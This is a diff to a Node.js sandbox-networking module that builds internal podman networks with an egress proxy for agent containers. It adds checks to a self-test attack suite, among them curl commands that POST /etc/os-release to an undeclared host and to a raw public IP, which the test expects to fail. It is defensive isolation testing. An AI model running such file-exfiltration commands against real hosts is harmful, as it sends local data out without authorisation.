@@ -78,11 +78,13 @@
  * normal one. No `podman network connect` step, and so no window where the
  * proxy is running but not yet dual-homed.
  *
- * WHAT THIS DOES NOT DO: run the agent container itself. `sandbox.mjs run
- * --net <name>` already accepts an arbitrary podman network name in its `net`
- * flag (it just does `--network <net>`, unmodified here), which puts the agent
- * on the internal network. It cannot yet pass `--add-host`, so the agent has
- * no name for the proxy until that flag is added there (see `agentNetFlag`).
+ * WHAT THIS DOES NOT DO: run the agent container itself. A run gets its own
+ * internal network and proxy from `withRunEgress`, which hands the harness
+ * the network name, the `--add-host` flags that name the proxy, and the proxy
+ * environment; `runstore.mjs run --egress` wires those into the agent's
+ * container (C-5, checked by bin/egress-attribution.test.mjs). By hand,
+ * `sandbox.mjs run --net <internal-net>` puts a command on the network, with
+ * no name for the proxy.
  *
  * Usage:
  *   netns.mjs create-internal <name>
@@ -92,6 +94,7 @@
  *   netns.mjs teardown <name...>
  */
 import { execFileSync, spawnSync } from "node:child_process";
+import { mkdirSync, writeFileSync } from "node:fs";
 import { fileURLToPath } from "node:url";
 import { dirname, resolve } from "node:path";
 
@@ -205,9 +208,8 @@ export function agentHostArgs(proxyIp, alias = "proxy") {
 /**
  * What to pass sandbox.mjs as `--net`. `sandbox.mjs run --net <name>` does
  * exactly `--network <name>`, so the internal network's name IS the value.
- * The agent also needs `agentHostArgs` to reach the proxy, and sandbox.mjs
- * has no way to pass `--add-host` yet, so wiring a real agent run through the
- * proxy still needs that flag added there.
+ * The agent also needs `agentHostArgs` to reach the proxy by name; a run
+ * through runstore gets them from `withRunEgress` as extra run flags.
  */
 export function agentNetFlag(internalNetwork) {
   return internalNetwork;
@@ -309,7 +311,7 @@ function attackerRun({ network, image, cmd, extraArgs = [], timeoutMs = 15000 })
 }
 
 /**
- * E-3, made runnable rather than left as a claim. Five attacks against a LIVE
+ * E-3, made runnable rather than left as a claim. Eight attacks against a LIVE
  * network + proxy — this shells out to real `podman run` invocations, same as
  * a human would from the command line, and returns each command alongside its
  * real output so a report can quote it rather than paraphrase it.
@@ -331,6 +333,7 @@ export function runAttackSuite({
   victimNetwork = null,
   victimHost = null, // "ip:port" of a container on victimNetwork, if reachability across networks is being checked
   hostProbe = null, // "host:port" of something bound on the real host, if that check is wanted
+  rawIp = "1.1.1.1", // a public address, dialled by number so no name lookup is involved
   agentImage = "docker.io/library/nginx:alpine", // has curl AND busybox wget; nothing here is agent-specific
 }) {
   if (!internalNetwork) throw new Error("runAttackSuite needs internalNetwork");
@@ -389,6 +392,41 @@ export function runAttackSuite({
     );
   }
 
+  // 3b. The same bypass by NUMBER. Attack 3 dials a name, and on a network
+  // with DNS off it fails at "Could not resolve host", which proves there is
+  // no DNS, not that there is no route (independent review). A raw IP skips
+  // the lookup, so only a missing route can stop it, and a DNS failure here
+  // would mean the test did not test what it says.
+  {
+    const command = `curl -sS https://${rawIp}/ -o /dev/null -w 'HTTP_STATUS=%{http_code}' --max-time 8 2>&1`;
+    record(
+      "bypassing the proxy by raw IP finds no route",
+      (out) => out.status !== 0 && !/Could not resolve/.test(out.stdout) && !/HTTP_STATUS=[1-5]\d\d/.test(out.stdout),
+      { command, out: attack(command) },
+    );
+  }
+
+  // E-2's own claim, as an attack (independent re-review: no test tried to
+  // POST anything out). A file's bytes, sent to an undeclared host through
+  // the proxy, and straight to a raw IP. Both must fail; the first by the
+  // proxy's 403, the second for want of a route.
+  {
+    const command = `curl -sS -x http://${proxyAlias}:${proxyPort} -X POST --data-binary @/etc/os-release https://${deniedHost}/upload -o /dev/null -w 'HTTP_STATUS=%{http_code}' --max-time 8 2>&1`;
+    record(
+      "POSTing a file to an undeclared host through the proxy is refused (403)",
+      (out) => /CONNECT tunnel failed, response 403/.test(out.stdout) || /HTTP_STATUS=403/.test(out.stdout),
+      { command, out: attack(command) },
+    );
+  }
+  {
+    const command = `curl -sS -X POST --data-binary @/etc/os-release https://${rawIp}/upload -o /dev/null -w 'HTTP_STATUS=%{http_code}' --max-time 8 2>&1`;
+    record(
+      "POSTing a file straight to a raw IP finds no route",
+      (out) => out.status !== 0 && !/Could not resolve/.test(out.stdout) && !/HTTP_STATUS=[1-5]\d\d/.test(out.stdout),
+      { command, out: attack(command) },
+    );
+  }
+
   // 4. Reach another container on the host (a different, non-internal
   // network) — must fail. Optional: needs a victim already running.
   if (victimHost) {
@@ -413,6 +451,16 @@ export function runAttackSuite({
   }
 
   return results;
+}
+
+/**
+ * E-3: the attacks' commands and their real output, written where a person
+ * can read them after the run, not only to a test's stdout. One JSON file.
+ */
+export function writeAttackReport(path, results, meta = {}) {
+  mkdirSync(dirname(path), { recursive: true });
+  writeFileSync(path, `${JSON.stringify({ at: new Date().toISOString(), ...meta, results }, null, 2)}\n`);
+  return path;
 }
 
 /* --------------------------------------------------------------------- cli */
